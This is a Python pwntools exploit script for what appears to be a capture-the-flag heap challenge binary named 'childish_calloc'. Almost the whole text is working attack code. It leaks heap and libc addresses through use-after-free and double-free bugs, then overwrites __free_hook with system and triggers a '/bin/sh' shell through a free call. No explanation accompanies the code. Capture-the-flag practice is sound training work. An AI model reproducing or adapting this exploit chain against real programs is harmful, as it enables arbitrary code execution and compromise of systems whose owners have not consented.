from pwn import *
r = process('./childish_calloc')
def find(x, y, z):
    r.sendlineafter(':', '1')
    r.sendlineafter(':', str(x))
    r.sendlineafter(':', str(y))
    r.sendafter(':', z)
def fix(x, y, z, a):
    r.sendlineafter(':', '2')
    r.sendlineafter(':', str(x))
    r.sendlineafter(':', str(y))
    r.sendafter(':', z)
    r.sendlineafter(':', str(a))
def free(x):
    r.sendlineafter(':', '2')
    r.sendlineafter(':', str(x))
    r.sendlineafter(':', str(123))
def examine(x):
    r.sendlineafter(':', '3')
    r.sendlineafter(':', str(x))
def save(x):
    r.sendlineafter(':', '4')
    r.sendlineafter(':', str(x))
def calc(x, y):
    return ((0xffffffffffffffff-x)+y)&0xffffffffffffffff

 # 0x1f is the smallest we can allocate
 # 0x38 is the max we can allocate
def pwn():
    #The heap leak
    find(0, 0x38, 'A'*0x38)
    find(1, 0x38, 'B'*0x38)
    free(1)
    free(0)
    examine(0)
    heap = u64(r.recvline()[1:].rstrip().ljust(8, b'\x00'))
    log.success('Heap @ '+hex(heap))

    # The libc leak
    find(2, 0x28, 'A'*0x27)
    find(3, 0x28, 'B'*0x27)
    find(4, 0x28, '\x00'*0x27)
    find(5, 0x28, b'D'*0x18+p64(0x41))
    find(6, 0x28, p64(0)+p64(0x43))
    free(2)
    free(3)
    find(7, 0x28, 'F'*0x28+chr(0x91))
    find(8, 0x28, 'G'*0x28+chr(0x91))


    for i in range(0, 3):
        free(3)
        free(4)
    free(3)
    free(3)
    find(9, 0x28, 'H'*0x28+chr(0x33))

    find(10, 0x38, b'\x41'*0x30+p64(0x33))
    fix(10, 0x28, 'B', 1)
    libc = (u64(r.recvline()[2:].rstrip().ljust(8, b'\x00'))<<8)-4111360
    fhook = libc+0x3ed8e8
    fix(2, 0x31, 'A', 2)

    log.success('Libc @ '+hex(libc))
    sys = libc+0x4f440

    free(0)
    fix(1, 0x38, p64(heap+240+0x20), 2)
    find(12, 0x38, 'A')
    find(13, 0x38, 'A')
    find(14, 0x38, b'z'*0x8*3+p64(0xffffffffffffffff))

    save(calc(heap+320-0x30, fhook-0xc0))

    fix(12, 0x28, 'A', 2)
    fix(13, 0x28, 'A', 2)
    fix(5, 0x38, 'A', 2)
    fix(1, 0x28, 'A', 2)
    fix(2, 0x38, p64(libc+4118712-0x10)+p64(0), 2)
    find(11, 0x28, p64(0)*4+p64(0x43))
    fix(12, 0x38, 'A', 2)
    fix(13, 0x38, '(/bin/sh; cat)', 2)
    fix(1, 0x38, p64(0x42)+p64(0)*3+p64(libc+6370688)+p64(1)+p64(sys), 2)

    r.sendline('2')
    r.sendline('13')

    r.interactive()

pwn()